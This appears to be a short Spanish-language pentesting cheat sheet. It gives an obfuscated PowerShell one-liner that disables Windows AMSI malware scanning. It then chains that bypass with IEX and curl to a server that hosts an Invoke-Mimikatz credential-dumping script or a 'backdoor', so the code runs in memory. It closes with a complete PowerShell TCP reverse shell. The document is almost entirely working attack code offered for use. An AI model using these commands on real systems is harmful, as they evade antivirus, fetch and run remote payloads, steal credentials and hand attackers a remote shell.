# Amsi Bypass Powershell #

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true)
```

# Ejemeplo de uso:

Guardar en un archivo, este script de Mimikatz del este repo:
https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1

Abres un servidor con Python o Apache y guardas el archivo con cualquier formato hasta en Webhost/Pastebin/Github etc, cualquier servidor con formato Raw

# Ejemplo:

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true); IEX (curl http://192.168.0.7/backdoor)
```

Con lo anterior Bypasseas amsi y haces una descarga del codigo del servidor y lo ejecutas en memoria

Tambien puedes guardar una reverse shell en el servidor

# Ejemplo:

```
$client = New-Object System.Net.Sockets.TCPClient("ip",puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

